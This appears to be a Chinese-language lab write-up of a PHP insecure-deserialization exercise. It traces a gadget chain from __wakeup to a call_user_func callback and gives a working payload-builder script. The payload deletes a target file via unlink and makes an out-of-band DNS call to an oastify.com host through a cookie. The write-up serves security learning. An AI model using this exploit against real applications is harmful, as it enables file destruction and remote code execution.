源码序列化构造分析
- `CustomTemplate` 对象的反序列化魔术方法 `__wakeup` 作为初始立足点
    ```php
    public function __wakeup() {
        $this->build_product();
    }
    ```

- 魔术方法调用本对象方法，使用两个属性新建对象 `Product`
    ```php
    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
    ```

- `Product` 在构造时，将参数2作为对象，将参数1作为参数2的属性访问，此时触发 `__get` 魔术方法
    ```php
    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
    ```

- `DefaultMap` 对象拥有 `__get` 魔术方法（当属性不存在时触发），且其中包含回调函数执行
    ```php
    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
    ```
    - `callback` 属性设置回调函数
    - `name` 被访问的属性名设置回调函数参数

构造 php 序列化对象载荷
- 载荷构造代码
    ```php
    #!/usr/bin/env php
    <?php
    // 设置回调函数为删除文件的函数 unlink 
    class DefaultMap {
        private $callback;
        public function __construct($callback)
        {
            $this->callback = $callback;
        }
    }

    // 设置立足点，新建对象的参数1为回调函数参数，参数2为拥有触发回调函数魔术方法的对象
    class CustomTemplate {

        private $default_desc_type;
        private $desc;

        public function __construct($cb_func, $cb_arg)
        {
            // 设置回调函数
            $this->desc = new DefaultMap($cb_func);
            // 设置用于回调函数的参数
            $this->default_desc_type = $cb_arg;
        }
    }

    // print rawurlencode(base64_encode(serialize(new CustomTemplate('unlink', '/home/carlos/morale.txt'))));

    print rawurlencode(base64_encode(serialize(new CustomTemplate('gethostbynamel', 'id.oastify.com'))));
    ?>
    ```
- 在 cookie 中设置载荷
    - 删除目标文件成功，带外连通性测试成功
